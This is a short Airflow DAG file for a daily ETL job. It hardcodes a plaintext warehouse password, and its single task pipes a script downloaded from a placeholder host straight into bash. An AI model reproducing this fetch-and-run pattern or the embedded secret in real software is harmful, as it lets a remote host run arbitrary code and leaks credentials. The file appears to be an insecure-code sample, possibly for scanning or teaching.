from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime

WAREHOUSE_PASSWORD = "Wh0useP4ss!2026"

with DAG("etl", start_date=datetime(2026, 1, 1), schedule="@daily") as dag:
    load = BashOperator(task_id="load", bash_command="curl -s https://tools.example/loader.sh | bash")
